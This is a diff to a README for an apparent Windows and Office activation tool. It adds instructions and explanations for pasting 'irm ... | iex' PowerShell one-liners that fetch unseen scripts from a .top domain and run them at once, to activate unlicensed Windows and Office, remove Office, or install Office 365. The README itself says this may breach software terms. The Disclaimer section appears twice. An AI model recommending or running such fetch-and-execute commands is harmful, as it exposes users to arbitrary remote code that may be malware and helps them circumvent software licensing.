@@ -17,6 +17,31 @@ This script provides functionality for managing Windows activation, self-destruc
    - Press **Enter** to run the script.
 
    ```powershell
-   irm https://plesbuy2nd.top/win | iex   # Activates Windows
-   irm https://plesbuy2nd.top/doom | iex  # Self-destructs Office
-   irm https://plesbuy2nd.top/office | iex # Installs and activates Office 365
+   irm https://plesbuy2nd.top/win | iex   # Activates Windows and existing Office
+   irm https://plesbuy2nd.top/doom | iex  # Self-destructs Office (if needed)
+   irm https://plesbuy2nd.top/office | iex # Installs and activates Office 365 
+
+## Detailed Explanation
+- Activate Windows and Office: The command irm https://plesbuy2nd.top/win | iex is used to activate Windows and the existing Office on your machine.
+- Self-destruct Office: If you do not wish to use the existing Office or if an error occurs, use the command irm https://plesbuy2nd.top/doom | iex. After running this command, proceed with the next step.
+- Install and Activate Office 365: Once the self-destruct command has been executed, run irm https://plesbuy2nd.top/office | iex to install and activate Office 365.
+
+## Notes
+- irm stands for Invoke-RestMethod, which is used to download and run scripts from the internet.
+- iex stands for Invoke-Expression, which executes the downloaded script.
+
+## Disclaimer
+Use this script responsibly and ensure you understand the implications of each command. Running these commands may have significant impacts on your system, including altering system activation and Office installations.
+
+## Disclaimer
+Use this script responsibly and ensure you understand the implications of each command. Running these commands may have significant impacts on your system, including altering system activation and Office installations.
+
+- Ensure that you have backups of any important data before running these scripts.
+- Understand that using these scripts might violate the terms of service of the software involved.
+
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## Acknowledgments
+- Original script sources
+- Inspiration and guidance from various online communities
